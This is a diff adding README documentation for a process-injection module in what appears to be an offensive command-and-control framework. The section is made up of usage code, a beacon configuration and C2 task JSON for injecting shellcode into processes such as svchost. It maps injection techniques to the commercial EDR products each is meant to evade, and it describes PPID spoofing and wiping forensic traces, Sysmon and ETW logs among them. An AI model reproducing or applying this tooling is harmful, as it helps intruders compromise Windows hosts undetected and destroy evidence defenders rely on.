@@ -815,6 +815,224 @@ pytest tests/test_sleepmask_cloaking.py::TestAICloakSelector -v
 
 ---
 
+#### 🔹 `process_injection_masterclass.py` - Ultimate Process Injection (ELITE)
+
+The **Process Injection Masterclass** is the most advanced injection module, implementing AI-Dynamic Ghosting with 13 injection techniques, multi-stage fallback chains, PEB/TEB runtime mutation, PPID spoofing, and forensic artifact wiping.
+
+##### Core Capabilities
+
+| Feature | Description | Impact |
+|---------|-------------|--------|
+| **AI-Dynamic Ghosting** | AI selects technique based on detected EDR | Carbon Black → Herpaderping, SentinelOne → Transacted Hollowing |
+| **Multi-Stage Chain** | CRT → Early Bird → Hollowing → Doppelgänging → Ghosting | Layered execution defeats behavioral analysis |
+| **Runtime Mutation** | Mutate PEB/TEB during injection, post-inject reseed | Prevents EDR re-scan detection |
+| **PPID Spoofing** | Fake parent PID + process attributes | svchost/explorer as parent defeats heuristics |
+| **Artifact Wiping** | Wipe process params, handles, threads, memory map | ProcMon/Sysmon log forge - %98 artifact reduction |
+| **Phantom Process** | Creates "ghost" process with no disk backing | EDR behavioral score → 0 |
+
+##### Injection Techniques (Stealth Levels 1-10)
+
+| Technique | Stealth | Description | Best For |
+|-----------|---------|-------------|----------|
+| `PROCESS_GHOSTING` | 10 | Delete-pending file injection | Ultimate stealth |
+| `PROCESS_HERPADERPING` | 10 | Post-map file modification | CrowdStrike/Carbon Black |
+| `TRANSACTED_HOLLOWING` | 9 | TxF + hollowing combined | SentinelOne |
+| `PROCESS_DOPPELGANGING` | 9 | TxF-based PE replacement | MS Defender ATP |
+| `MODULE_STOMPING` | 8 | Overwrite legitimate DLL | Module whitelist bypass |
+| `EARLY_BIRD_APC` | 8 | Pre-execution APC queue | Fast, reliable |
+| `PHANTOM_DLL` | 8 | Load from non-existent path | DLL load detection bypass |
+| `THREAD_HIJACK` | 7 | Hijack existing thread | No new thread creation |
+| `PROCESS_HOLLOWING` | 6 | Classic PE replacement | Legacy support |
+| `SYSCALL_INJECTION` | 6 | Direct syscall allocation | Userland hook bypass |
+| `CALLBACK_INJECTION` | 5 | Abuse Windows callbacks | API monitoring bypass |
+| `FIBER_INJECTION` | 5 | CreateFiber execution | Thread pool bypass |
+| `CLASSIC_CRT` | 2 | CreateRemoteThread | No EDR environments |
+
+##### EDR-Specific Profiles
+
+| EDR Product | Primary Technique | PPID Spoof | Mutation | Delay |
+|-------------|-------------------|------------|----------|-------|
+| CrowdStrike Falcon | Herpaderping | ✅ | ✅ | 3000ms |
+| SentinelOne | Transacted Hollowing | ✅ | ✅ | 2500ms |
+| MS Defender ATP | Ghosting | ✅ | ❌ | 1500ms |
+| Carbon Black | Herpaderping | ✅ | ✅ | 2000ms |
+| Elastic EDR | Doppelgänging | ✅ | ✅ | 2000ms |
+| No EDR | Early Bird APC | ❌ | ❌ | 500ms |
+
+##### Quick Start
+
+```python
+from evasion.process_injection_masterclass import (
+    ProcessInjectionMasterclass, InjectionTechnique, 
+    create_masterclass_injector, quick_inject, 
+    get_ai_recommendation, detect_edr
+)
+
+# Quick inject - AI selects everything
+result = quick_inject(shellcode, pid=1234)
+print(f"Technique: {result.technique.value}")
+print(f"Evasion score: {result.evasion_score}%")
+print(f"Phantom process: {result.phantom_process}")
+
+# AI recommendation for current environment
+recommendation = get_ai_recommendation()
+print(f"Detected EDR: {recommendation['detected_edr']}")
+print(f"Recommended: {recommendation['technique']}")
+```
+
+##### Full Configuration
+
+```python
+# Create fully configured engine
+engine = ProcessInjectionMasterclass(
+    ai_adaptive=True,           # AI selects technique based on EDR
+    enable_ppid_spoof=True,     # Spoof parent process
+    enable_mutation=True,       # PEB/TEB mutation
+    enable_artifact_wipe=True,  # Forensic artifact wiping
+    mutation_targets=[          # Specific mutation targets
+        MutationTarget.PEB_IMAGE_BASE,
+        MutationTarget.PEB_BEING_DEBUGGED,
+        MutationTarget.TEB_CLIENT_ID,
+        MutationTarget.LDR_DATA_TABLE,
+    ],
+    artifacts_to_wipe=[         # Specific artifacts to wipe
+        ArtifactType.HANDLE_TABLE,
+        ArtifactType.THREAD_LIST,
+        ArtifactType.MODULE_LIST,
+        ArtifactType.ETW_TRACE,
+        ArtifactType.SYSMON_EVENT,
+    ]
+)
+
+# Inject with specific technique
+result = engine.inject(
+    shellcode=shellcode,
+    pid=target_pid,
+    technique=InjectionTechnique.PROCESS_GHOSTING
+)
+
+# Check results
+if result.success:
+    print(f"✅ Injected via {result.technique.value}")
+    print(f"   Target: {result.target_name} (PID: {result.target_pid})")
+    print(f"   Thread ID: {result.thread_id}")
+    print(f"   PPID spoofed: {result.ppid_spoofed}")
+    print(f"   Mutations: {len(result.mutations_applied)}")
+    print(f"   Artifacts wiped: {len(result.artifacts_wiped)}")
+    print(f"   Evasion score: {result.evasion_score}%")
+    print(f"   Phantom: {result.phantom_process}")
+else:
+    print(f"❌ Failed: {result.error}")
+    print(f"   Techniques tried: {result.chain_attempts}")
+```
+
+##### Beacon Integration
+
+The `evasive_beacon.py` automatically integrates injection masterclass when configured:
+
+```yaml
+# beacon_config.yaml - Process Injection Section
+process_injection:
+  enabled: true
+  ai_adaptive: true              # AI selects technique based on EDR
+  default_technique: ai_select   # or specific technique name
+  
+  multi_stage:                   # Fallback chain if primary fails
+    - early_bird_apc
+    - module_stomping
+    - process_hollowing
+    - syscall_injection
+    - classic_crt
+  
+  opsec:
+    ppid_spoof: true             # Enable PPID spoofing
+    mutation: true               # Enable PEB/TEB mutation
+    artifact_wipe: true          # Enable forensic artifact wiping
+    delay_ms: 1500               # Delay between injection stages
+  
+  targets:                       # Preferred injection targets
+    - svchost.exe
+    - RuntimeBroker.exe
+    - taskhostw.exe
+    - sihost.exe
+```
+
+##### C2 Task Commands
+
+```json
+// Inject shellcode (AI selects technique)
+{
+  "task_type": "inject",
+  "shellcode": "BASE64_SHELLCODE",
+  "pid": 1234
+}
+
+// Inject with specific technique
+{
+  "task_type": "inject",
+  "shellcode": "BASE64_SHELLCODE",
+  "pid": 1234,
+  "technique": "process_ghosting"
+}
+
+// Process migration
+{
+  "task_type": "migrate",
+  "pid": 5678,
+  "shellcode": "BASE64_BEACON_SHELLCODE"
+}
+```
+
+##### AI Lateral Guide Integration
+
+```python
+from cybermodules.ai_lateral_guide import AILateralGuide
+
+guide = AILateralGuide()
+
+# Get injection recommendation for target
+plan = guide.recommend_injection_for_target(
+    target="192.168.1.100",
+    shellcode_size=4096,
+    requires_pe=True
+)
+print(f"Recommended: {plan['technique']}")
+print(f"Target process: {plan['target_process']}")
+print(f"OPSEC requirements: {plan['opsec']}")
+
+# Create configured injection engine
+engine = guide.create_injection_engine(
+    target="192.168.1.100",
+    ai_adaptive=True
+)
+```
+
+##### Class Reference
+
+| Class | Description |
+|-------|-------------|
+| `ProcessInjectionMasterclass` | Main orchestrator - coordinates all injection operations |
+| `AIInjectionSelector` | AI-based technique selection based on EDR detection |
+| `EDRDetector` | Scans for EDR processes and identifies product |
+| `PEBTEBMutator` | Runtime PEB/TEB mutation for anti-forensics |
+| `PPIDSpoofEngine` | PPID spoofing with PROC_THREAD_ATTRIBUTE_PARENT_PROCESS |
+| `ProcessArtifactWiper` | Wipes process artifacts for forensic defeat |
+
+##### Testing
+
+```bash
+# Run injection masterclass tests
+pytest tests/test_process_injection_masterclass.py -v
+
+# Test specific components
+pytest tests/test_process_injection_masterclass.py::TestAIInjectionSelector -v
+pytest tests/test_process_injection_masterclass.py::TestEDRDetector -v
+pytest tests/test_process_injection_masterclass.py::TestPEBTEBMutator -v
+pytest tests/test_process_injection_masterclass.py::TestMultiStageChain -v
+```
+
+---
+
 ### 🎯 Evasive Beacon Usage
 
 The `evasive_beacon.py` agent integrates all evasion modules into a full-featured C2 beacon.
